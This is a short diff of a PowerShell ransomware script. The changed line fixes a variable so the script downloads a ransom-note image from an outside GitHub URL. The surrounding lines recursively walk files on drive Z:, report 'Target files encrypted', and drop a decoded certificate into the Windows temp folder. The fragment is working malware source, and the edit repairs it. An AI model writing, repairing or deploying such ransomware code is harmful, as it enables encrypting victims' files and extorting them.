@@ -298,7 +298,7 @@ foreach ($i in $(Get-ChildItem Z:\ -recurse -include *.*  | ForEach-Object { $_.
 # Start-Sleep -s 2
 
 $ransom = "https://raw.githubusercontent.com/ecoterror443/filerep/main/ransom.jpg"
-Invoke-WebRequest -Uri $alert -OutFile "c:/temp/ransom.jpg"
+Invoke-WebRequest -Uri $ransom -OutFile "c:/temp/ransom.jpg"
 
 Write-Host "[+] Target files encrypted..." -ForegroundColor Green
 $encodedcert =  [IO.File]::WriteAllBytes("c:/windows/temp/x.cer", [Convert]::FromBase64String($encodedcert))
